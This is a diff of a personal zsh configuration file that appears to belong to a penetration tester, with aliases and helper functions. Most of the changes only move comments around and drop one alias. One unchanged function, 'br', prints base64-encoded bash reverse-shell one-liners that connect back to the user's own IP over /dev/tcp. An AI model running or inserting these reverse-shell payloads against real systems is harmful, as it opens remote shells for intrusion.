@@ -1,6 +1,7 @@
 # Preferred 'ls' for detailed and sorted directory listing
 alias ll='ls -lsaht --color=auto --group-directories-first'
 
+# Quickly set environment variable e.g. "ee user henry"
 function ee() { export $1="$2" }
 
 # For ease of use
@@ -9,11 +10,9 @@ function get_myip() {
     echo -n $myip | xclip -selection clipboard
     export myip=$myip
 }
-get_myip
+get_myip # for tun0, now you can echo $myip
 
 alias reload="source $HOME/.zshrc"
-
-alias serve="echo http://$myip; python -m http.server"
 
 # Decode base64
 decode64() {
@@ -27,7 +26,7 @@ function gn() { grep -ri $1 ~/repos/offsec/$2 }
 # Colored and context-aware grep with PCRE support
 alias grep='grep --color=auto -P'
 
-function ee() { export $1="$2" } # Quickly set environment variable e.g. "ee user henry"
+function ee() { export $1="$2" } 
 function en() { echo -n "$1" | $@ } # 
 function cn() { cat $1 | grep -i $@ }
 function ec() { echo -n "$1" | wc -c }
@@ -102,7 +101,6 @@ function br() {
     echo -n "bash -i  >& /dev/tcp/$myip/$1 0>&1  " | base64 ;
     echo -n "bash -i  >& /dev/tcp/$myip/$1  0>&1" | base64 ;
 }
-
 
 # Clean Rustscan output for better readability
 alias clean='sed -e '\''s/\x1b\[[0-9;]*m//g'\'''
